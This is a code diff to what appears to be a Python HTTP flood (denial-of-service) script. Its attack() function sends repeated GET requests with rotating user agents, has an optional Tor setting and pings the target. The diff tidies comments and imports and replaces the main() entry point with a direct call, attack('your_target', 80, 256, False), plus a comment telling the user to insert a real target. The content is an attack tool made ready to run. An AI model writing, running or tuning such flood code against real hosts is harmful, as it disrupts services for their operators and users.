@@ -3,7 +3,7 @@ import requests
 import threading
 import time
 import random
-from ping3 import ping, verbose_ping
+from ping3 import ping
 
 useragents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
@@ -18,11 +18,11 @@ def attack(target, port, threads, use_tor):
         try:
             response = requests.get(url, headers=headers, timeout=5)
             print(f"Connected to host... Status Code: {response.status_code}")
-            
-            # Ping the target after successful connection
+
+            # Ping the target after a successful connection
             ping_time = ping(target)
             print(f"Ping to {target}: {ping_time} ms")
-            
+
         except Exception as e:
             print(f"Error: {str(e)}")
 
@@ -35,7 +35,6 @@ def attack(target, port, threads, use_tor):
         sleep_time = 20 if not use_tor else 40
         time.sleep(sleep_time)
 
-# ... reszta kodu bez zmian
+# Call the attack function directly
+attack("your_target", 80, 256, False)  # Replace "your_target" with the actual target
 
-if __name__ == "__main__":
-    main()
